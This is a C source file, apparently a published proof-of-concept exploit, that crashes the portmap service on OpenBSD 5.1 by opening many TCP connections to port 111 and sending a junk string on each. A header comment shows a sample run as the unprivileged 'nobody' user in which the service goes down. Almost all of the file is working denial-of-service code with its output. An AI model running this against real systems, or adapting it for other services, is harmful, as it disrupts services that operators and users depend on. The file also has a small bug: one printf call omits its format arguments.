/*
 * authors: 22733db72ab3ed94b5f8a1ffcde850251fe6f466
 *          6e2d3d47576f746e9e65cb4d7f3aaa1519971189
 *          c8e74ebd8392fda4788179f9a02bb49337638e7b
 * 
 *  greetz: 43c86fd24bd63b100891ec4b861665e97230d6cf
 *          e4c0f3f28cf322779375b71f1c14d6f8308f789d
 *          691cb088c45ec9e31823ca7ab0da8b4cf8079baf
 *          b234a149e7ef00abc0f2ec7e6cf535ef4872eabc
 *
 *
 * -bash-4.2$ uname -a
 * OpenBSD obsd.my.domain 5.1 GENERIC#160 i386
 * -bash-4.2$ id
 * uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)
 * -bash-4.2$ netstat -an -f inet | grep 111
 * tcp          0      0  127.0.0.1.111          *.*                    LISTEN
 * tcp          0      0  *.111                  *.*                    LISTEN
 * udp          0      0  127.0.0.1.111          *.*
 * udp          0      0  *.111                  *.*
 * -bash-4.2$ gcc openbsd_libc_portmap.c
 * -bash-4.2$ ./a.out
 * [+] This code doesn't deserve 1337 status output.
 * [+] Trying to crash portmap on 127.0.0.1:111
 * [+] 127.0.0.1:111 is now down.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define HOST "127.0.0.1"
#define PORT 111
#define LOOP 0x100


int main(void)
{
    int s, i;
    struct sockaddr_in saddr;

    printf("[+] This code doesn't deserve 1337 status output.\n");
    printf("[+] Trying to crash portmap on %s:%d\n", HOST, PORT);

    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(PORT);
    saddr.sin_addr.s_addr = inet_addr(HOST);

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(connect(s, (struct sockaddr *) &saddr, sizeof(struct sockaddr_in)) == -1) {
        printf("[-] %s:%d is already down.\n", HOST, PORT);
        return EXIT_FAILURE;
    }

    /* # of iteration needed varies but starts working for > 0x30  */
    for(i=0; i < LOOP; ++i) {
        s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(s, (struct sockaddr *) &saddr, sizeof(struct sockaddr_in));
        send(s, "8========@", 10, 0);
    }

    if(connect(s, (struct sockaddr *) &saddr, sizeof(struct sockaddr_in)) == -1)
        printf("[+] %s:%d is now down.\n", HOST, PORT);
    else
        printf("[-] %s:%d is still listening. Try to increase loop iterations...\n");

    return EXIT_SUCCESS;
}